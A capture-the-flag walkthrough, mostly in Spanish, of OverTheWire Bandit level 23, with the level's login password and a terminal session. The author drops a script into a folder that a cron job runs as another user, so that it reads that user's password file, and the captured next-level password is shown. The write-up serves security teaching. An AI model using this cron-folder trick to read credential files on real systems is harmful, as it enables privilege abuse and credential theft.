## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
+ user -> bandit23
+ password -> QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G


## Solución
``` bash

bandit23@bandit:~$ 
bandit23@bandit:~$ ls -la /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Feb 21 22:04 .
drwxr-xr-x 108 root root 12288 Feb 21 22:04 ..
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit22
-rw-r--r--   1 root root   122 Feb 21 22:03 cronjob_bandit23
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit24
-rw-r--r--   1 root root    62 Feb 21 22:03 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Feb 21 22:04 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done


bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls -la
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/pass24
mkdir: cannot create directory ‘/tmp/pass24’: File exists
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/dark24
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/dark24
bandit23@bandit:/tmp/dark24$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/dark24/password" > mio.sh  
bandit23@bandit:/tmp/dark24$ chmod 777 mio.sh
bandit23@bandit:/tmp/dark24$ touch password
bandit23@bandit:/tmp/dark24$ chmod 666 password
bandit23@bandit:/tmp/dark24$ ls -la
total 100
drwxrwxr-x    2 bandit23 bandit23  4096 Feb 24 19:27 .
drwxrwx-wt 2464 root     root     94208 Feb 24 19:28 ..
-rwxrwxrwx    1 bandit23 bandit23    54 Feb 24 19:26 mio.sh
-rw-rw-rw-    1 bandit23 bandit23     0 Feb 24 19:27 password
bandit23@bandit:/tmp/dark24$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/dark24$ cp mio.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/dark24$ cat password
bandit23@bandit:/tmp/dark24$ cat password
bandit23@bandit:/tmp/dark24$ cat password
bandit23@bandit:/tmp/dark24$ ls -la
total 104
drwxrwxr-x    2 bandit23 bandit23  4096 Feb 24 19:27 .
drwxrwx-wt 2466 root     root     94208 Feb 24 19:32 ..
-rwxrwxrwx    1 bandit23 bandit23    54 Feb 24 19:26 mio.sh
-rw-rw-rw-    1 bandit23 bandit23    33 Feb 24 19:32 password
bandit23@bandit:/tmp/dark24$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/dark24$ 








```
## Notas adicionales
Se crea una carpeta temporal para poder realizar un script, el script consiste en mandar todo lo del usuario 24 a la carpeta temporal depues se manda el script a la ruta /var/spool/bandit24/mio.sh para que se ejecute y posteriormente nos de el comando. 


## Referencias